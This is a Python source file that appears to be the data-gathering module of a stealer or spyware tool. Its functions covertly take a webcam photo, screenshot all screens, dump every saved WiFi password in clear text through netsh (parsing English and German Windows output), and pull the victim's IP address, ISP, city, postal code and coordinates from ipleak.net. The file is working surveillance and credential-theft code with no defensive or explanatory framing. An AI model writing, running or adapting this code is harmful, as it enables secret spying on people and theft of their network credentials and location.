import cv2, subprocess, requests, json # type:ignore
from PIL import ImageGrab
from urllib.request import Request, urlopen

def take_image(path:str) -> None:
    """Takes an image with the webcam."""

    # Open the default camera (usually the first one)
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        return
    
    # Capture a frame from the webcam
    ret, frame = cap.read()
    
    if not ret:
        cap.release()
        return
    
    # Release the camera
    cap.release()
    
    # Write the captured frame to a file
    cv2.imwrite(path, frame)

def capture(
        path: str = "",
        bbox = None,
        all_screens: bool = True,
        include_layered_windows: bool = False,
        xdisplay = None
) -> None:
    """Takes a screenshot of the current screen."""

    image = ImageGrab.grab(
        bbox=bbox,
        all_screens=all_screens,
        include_layered_windows=include_layered_windows,
        xdisplay=xdisplay
    )
    image.save(path)
    image.close()

def get_wifi_pwds() -> dict[str, str]:
    """
    Gets all saved WiFi passwords.\n
    Returns a dictionary with the WiFi names as keys and their passwords as values.
    """

    wifi_passwords: dict[str, str] = {}

    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('cp850').split('\n')
    except:
        pass

    try:
        for profile in profiles:
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile "{profile_name}" key=clear', shell=True).decode('cp850').split('\n')
                except subprocess.CalledProcessError as e:
                    continue

                for line in output:
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        wifi_passwords[profile_name] = password
                        break
    except:
        pass

    try:
        for profile in profiles:
            if "Profil für alle Benutzer" in profile:
                profile_name = profile.split(":")[1].strip()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile "{profile_name}" key=clear', shell=True).decode('cp850').split('\n')
                except subprocess.CalledProcessError as e:
                    #print_d(alert, e)
                    continue

                for line in output:
                    if "Schlüsselinhalt" in line:
                        password = line.split(":")[1].strip()
                        wifi_passwords[profile_name] = password
                        break
    except:
        pass

    # Writing the passwords to the file
    try:
        pwds: dict[str, str] = {}
        for profile, password in wifi_passwords.items():
            pwds[profile] = password
    except Exception as e:
        raise Exception("The passwords couldn't be formatted!")
    
    return pwds

def leak_all() -> dict[str, str]:
    # Define the variables from ipleak
    r = requests.get('https://ipleak.net/json/')
    web_data: dict[str, str] = json.loads(r.text)  # Convert the text to JSON format

    data: dict[str, str] = {
        "as_number": web_data['as_number'],
        "isp_name": web_data['isp_name'],
        "country_code": web_data['country_code'],
        "country": web_data['country_name'],
        "region_code": web_data['region_code'],
        "region_name": web_data['region_name'],
        "continent_code": web_data['continent_code'],
        "continent_name": web_data['continent_name'],
        "city_name": web_data['city_name'],
        "postal_code": web_data['postal_code'],
        "postal_confidence": web_data['postal_confidence'],
        "latitude": web_data['latitude'],
        "longitude": web_data['longitude'],
        "accuracy_radius": web_data['accuracy_radius'],
        "time_zone": web_data['time_zone'],
        "metro_code": web_data['metro_code'],
        "level": web_data['level'],
        "cache": web_data['cache'],
        "ip": web_data['ip'],
        "reverse": web_data['reverse'],
        "query_text": web_data['query_text'],
        "query_type": web_data['query_type'],
        "query_date": web_data['query_date']
    }

    return data